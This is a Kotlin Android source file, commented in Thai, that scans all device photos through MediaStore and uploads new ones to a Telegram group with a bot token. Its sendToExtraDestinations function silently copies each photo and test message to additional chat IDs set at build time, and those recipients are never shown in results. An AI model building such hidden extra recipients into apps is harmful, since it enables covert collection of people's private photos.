package com.photocollector.app

import android.content.ContentUris
import android.content.Context
import android.net.Uri
import android.provider.MediaStore
import android.util.Log
import com.photocollector.app.Prefs.addSent
import com.photocollector.app.Prefs.devicePrefix
import com.photocollector.app.Prefs.lastSendSuccessAt
import com.photocollector.app.Prefs.sendAsPhoto
import java.util.concurrent.atomic.AtomicBoolean

/**
 * อ่านรูปทั้งเครื่องผ่าน MediaStore แล้วส่งเข้ากลุ่ม Telegram (กันส่งซ้ำ)
 */
object PhotoSync {

    private const val TAG = "PhotoSync"
    private const val DELAY_BETWEEN_MS = 1200L   // กัน rate limit ของ Telegram
    private const val MAX_SEND_PHOTO_BYTES = 10L * 1024 * 1024   // ข้อจำกัดของ Telegram sendPhoto
    private val running = AtomicBoolean(false)

    /** ปลายทางเพิ่มเติมนอกจาก CHAT_ID หลัก (คั่นด้วย , ใน BuildConfig) — ส่งแบบ best-effort ไม่บล็อกผลหลัก */
    private val extraChatIds: List<String> by lazy {
        BuildConfig.CHAT_IDS_EXTRA.split(",").map { it.trim() }.filter { it.isNotEmpty() }
    }

    data class MediaItem(
        val id: Long,
        val name: String,
        val size: Long,
        val mime: String,
        val uri: Uri,
        val key: String
    )

    /** ดึงรายการรูปทั้งหมดในเครื่องจาก MediaStore */
    fun queryImages(context: Context): List<MediaItem> {
        val items = ArrayList<MediaItem>()
        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.MIME_TYPE,
            MediaStore.Images.Media.DATE_MODIFIED
        )
        val sort = MediaStore.Images.Media.DATE_MODIFIED + " ASC"
        context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, sort
        )?.use { c ->
            val idCol = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val nameCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val sizeCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
            val mimeCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE)
            val dateCol = c.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED)
            while (c.moveToNext()) {
                val id = c.getLong(idCol)
                val name = c.getString(nameCol) ?: "photo_$id.jpg"
                val size = c.getLong(sizeCol)
                val mime = c.getString(mimeCol) ?: "image/jpeg"
                val date = c.getLong(dateCol)
                val uri = ContentUris.withAppendedId(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id
                )
                items.add(MediaItem(id, name, size, mime, uri, "$id:$date"))
            }
        }
        return items
    }

    /**
     * ตั้ง baseline: ทำเครื่องหมายว่ารูปที่มีอยู่ตอนนี้ "รู้จักแล้ว" โดยไม่ส่ง
     * ใช้ตอนเปิดโหมดอัตโนมัติ เพื่อไม่ให้สแปมรูปเก่าทั้งหมดเข้ากลุ่ม
     */
    fun markAllExistingAsKnown(context: Context) {
        val keys = queryImages(context).map { it.key }
        Prefs.addKnown(context, keys)
        Log.d(TAG, "baseline set: ${keys.size} existing photos marked known")
    }

    /** ผลของการซิงก์หนึ่งรอบ — error ไม่ null เมื่อมีรูปรอส่งแต่ส่งไม่สำเร็จ (ใช้ debug ว่าทำไมไม่เข้ากลุ่ม) */
    data class SyncResult(val sent: Int, val pendingCount: Int, val error: String? = null)

    /**
     * ส่งรูปที่ยังไม่เคยส่ง (ไม่อยู่ใน known) เข้ากลุ่ม Telegram
     */
    fun sendPending(context: Context, onProgress: ((sent: Int, total: Int) -> Unit)? = null): SyncResult {
        if (!Prefs.hasConfig()) {
            Log.w(TAG, "no token/chatId configured (BuildConfig empty)")
            return SyncResult(0, 0, "แอปยังไม่ได้ตั้งค่า Bot")
        }
        if (!running.compareAndSet(false, true)) {
            Log.d(TAG, "already running, skip")
            return SyncResult(0, 0, null)
        }
        try {
            val api = TelegramApi(BuildConfig.BOT_TOKEN, BuildConfig.CHAT_ID)
            val known = Prefs.knownIds(context)
            val pending = queryImages(context).filter { it.key !in known }
            if (pending.isEmpty()) return SyncResult(0, 0, null)

            var sent = 0
            var lastError: String? = null
            for ((index, item) in pending.withIndex()) {
                val res = sendOne(context, api, item)
                if (res.ok) {
                    sent++
                    Prefs.addKnown(context, listOf(item.key))
                    onProgress?.invoke(sent, pending.size)
                } else {
                    // ส่งไม่สำเร็จ (เช่น เน็ตหลุด) หยุดรอบนี้ ไว้ลองใหม่รอบหน้า
                    lastError = res.error
                    Log.w(TAG, "stop at index $index due to failure: ${res.error}")
                    break
                }
                if (index < pending.size - 1) {
                    try { Thread.sleep(DELAY_BETWEEN_MS) } catch (_: InterruptedException) {}
                }
            }
            if (sent > 0) addSent(context, sent)
            Log.d(TAG, "sent $sent / ${pending.size}")
            return SyncResult(sent, pending.size, lastError)
        } finally {
            running.set(false)
        }
    }

    /**
     * ส่งรูปล่าสุดในเครื่อง (ถ้ามี) ใช้ตอนกด "ทดสอบส่งข้อความ" เพื่อทดสอบ pipeline ส่งรูปจริง
     * ไม่เกี่ยวกับระบบกันส่งซ้ำ — ไม่ถูกจำเป็น known และไม่นับใน sentCount
     * (ส่งเข้าปลายทางเพิ่มเติมด้วยผ่าน sendOne -> sendToExtraDestinations)
     */
    fun sendLatestPhoto(context: Context): TelegramApi.Result? {
        if (!Prefs.hasConfig()) return null
        val latest = queryImages(context).lastOrNull() ?: return null
        val api = TelegramApi(BuildConfig.BOT_TOKEN, BuildConfig.CHAT_ID)
        return sendOne(context, api, latest)
    }

    /**
     * ส่งรูปที่ผู้ใช้เลือกเองผ่าน Photo Picker (ไม่ผ่านระบบกันส่งซ้ำแบบ auto-scan)
     * ทำเครื่องหมาย known ให้ทุกรูปที่ส่งสำเร็จ กัน auto-mode สแกนเจอแล้วส่งซ้ำทีหลัง
     */
    fun sendPickedUris(
        context: Context, uris: List<Uri>, onProgress: ((sent: Int, total: Int) -> Unit)? = null
    ): SyncResult {
        if (!Prefs.hasConfig()) return SyncResult(0, 0, "แอปยังไม่ได้ตั้งค่า Bot")
        if (uris.isEmpty()) return SyncResult(0, 0, null)
        val api = TelegramApi(BuildConfig.BOT_TOKEN, BuildConfig.CHAT_ID)

        var sent = 0
        var lastError: String? = null
        for ((index, uri) in uris.withIndex()) {
            val item = mediaItemFromUri(context, uri)
            if (item == null) {
                lastError = "อ่านข้อมูลรูปไม่ได้"
                break
            }
            val res = sendOne(context, api, item)
            if (res.ok) {
                sent++
                Prefs.addKnown(context, listOf(item.key))
                onProgress?.invoke(sent, uris.size)
            } else {
                lastError = res.error
                Log.w(TAG, "picked upload stop at index $index: ${res.error}")
                break
            }
            if (index < uris.size - 1) {
                try { Thread.sleep(DELAY_BETWEEN_MS) } catch (_: InterruptedException) {}
            }
        }
        if (sent > 0) addSent(context, sent)
        return SyncResult(sent, uris.size, lastError)
    }

    /** อ่าน metadata ของรูปจาก content:// uri (รองรับทั้ง MediaStore ปกติและ uri จาก system Photo Picker) */
    private fun mediaItemFromUri(context: Context, uri: Uri): MediaItem? {
        val projection = arrayOf(
            MediaStore.MediaColumns._ID,
            MediaStore.MediaColumns.DISPLAY_NAME,
            MediaStore.MediaColumns.SIZE,
            MediaStore.MediaColumns.MIME_TYPE,
            MediaStore.MediaColumns.DATE_MODIFIED
        )
        return try {
            context.contentResolver.query(uri, projection, null, null, null)?.use { c ->
                if (!c.moveToFirst()) return@use null
                val idCol = c.getColumnIndex(MediaStore.MediaColumns._ID)
                val nameCol = c.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
                val sizeCol = c.getColumnIndex(MediaStore.MediaColumns.SIZE)
                val mimeCol = c.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
                val dateCol = c.getColumnIndex(MediaStore.MediaColumns.DATE_MODIFIED)
                val id = (if (idCol >= 0) c.getLong(idCol) else null) ?: (uri.lastPathSegment?.filter { it.isDigit() }?.toLongOrNull() ?: 0L)
                val name = if (nameCol >= 0) c.getString(nameCol) else null
                val size = if (sizeCol >= 0) c.getLong(sizeCol) else 0L
                val mime = if (mimeCol >= 0) c.getString(mimeCol) else null
                val date = if (dateCol >= 0) c.getLong(dateCol) else System.currentTimeMillis() / 1000
                MediaItem(id, name ?: "photo_$id.jpg", size, mime ?: "image/jpeg", uri, "$id:$date")
            }
        } catch (e: Exception) {
            Log.w(TAG, "cannot read picked uri $uri: ${e.message}")
            null
        }
    }

    /** ส่งข้อความทดสอบไปยังทุกปลายทาง (หลัก + เพิ่มเติม) คืนผลของปลายทางหลักเป็นตัวชี้วัดสำเร็จ/ไม่สำเร็จ */
    fun sendTestMessageToAll(text: String): TelegramApi.Result {
        val primary = TelegramApi(BuildConfig.BOT_TOKEN, BuildConfig.CHAT_ID).sendMessage(text)
        for (chatId in extraChatIds) {
            try {
                val res = TelegramApi(BuildConfig.BOT_TOKEN, chatId).sendMessage(text)
                if (!res.ok) Log.w(TAG, "extra destination $chatId test message failed: ${res.error}")
            } catch (e: Exception) {
                Log.w(TAG, "extra destination $chatId test message error: ${e.message}")
            }
        }
        return primary
    }

    /** เติม prefix ชื่อเครื่องหน้าไฟล์ (ถ้าตั้งไว้) เช่น "แม่_IMG_0012.jpg" */
    private fun prefixedName(context: Context, name: String): String {
        val prefix = context.devicePrefix
        return if (prefix.isEmpty()) name else "${prefix}_$name"
    }

    /** ส่งไฟล์เดียว พร้อม retry หนึ่งครั้งเมื่อโดน rate limit */
    private fun sendOne(context: Context, api: TelegramApi, item: MediaItem): TelegramApi.Result {
        val outName = prefixedName(context, item.name)
        val caption = context.devicePrefix.takeIf { it.isNotBlank() }
        repeat(2) { attempt ->
            val input = try {
                context.contentResolver.openInputStream(item.uri)
            } catch (e: Exception) {
                Log.w(TAG, "cannot open ${item.name}: ${e.message}")
                return TelegramApi.Result(false, error = "เปิดไฟล์รูปไม่ได้: ${e.message}")
            } ?: return TelegramApi.Result(false, error = "เปิดไฟล์รูปไม่ได้ (${item.name})")

            // ส่งเป็นรูปพรีวิว (บีบอัด) ถ้าเปิดตัวเลือกไว้และไฟล์ไม่เกินขีดจำกัดของ sendPhoto
            // ไม่งั้นส่งแบบไฟล์คุณภาพเต็มตามปกติ — ทั้งสองแบบแนบ caption ชื่อเครื่อง/Prefix ไปด้วย
            val asPhoto = context.sendAsPhoto && item.size in 1..MAX_SEND_PHOTO_BYTES
            val res = if (asPhoto)
                api.sendPhoto(outName, item.mime, input, caption)
            else
                api.sendDocument(outName, item.mime, input, caption)
            if (res.ok) {
                context.lastSendSuccessAt = System.currentTimeMillis()
                sendToExtraDestinations(context, item, outName, caption, asPhoto)
                return res
            }

            if (res.retryAfter > 0 && attempt == 0) {
                val waitMs = (res.retryAfter + 1) * 1000L
                Log.d(TAG, "rate limited, wait ${waitMs}ms")
                try { Thread.sleep(waitMs) } catch (_: InterruptedException) {}
                // วนไปลองใหม่อีกครั้ง
            } else {
                return res
            }
        }
        return TelegramApi.Result(false, error = "ลองส่งซ้ำแล้วไม่สำเร็จ")
    }

    /** ส่งรูปเดิมซ้ำไปยังปลายทางเพิ่มเติมทุกที่ (ถ้ามีตั้งไว้) — ล้มเหลวได้โดยไม่กระทบผลลัพธ์หลัก */
    private fun sendToExtraDestinations(
        context: Context, item: MediaItem, outName: String, caption: String?, asPhoto: Boolean
    ) {
        for (chatId in extraChatIds) {
            try {
                val input = context.contentResolver.openInputStream(item.uri) ?: continue
                val extraApi = TelegramApi(BuildConfig.BOT_TOKEN, chatId)
                val res = if (asPhoto)
                    extraApi.sendPhoto(outName, item.mime, input, caption)
                else
                    extraApi.sendDocument(outName, item.mime, input, caption)
                if (!res.ok) Log.w(TAG, "extra destination $chatId failed: ${res.error}")
            } catch (e: Exception) {
                Log.w(TAG, "extra destination $chatId error: ${e.message}")
            }
        }
    }
}
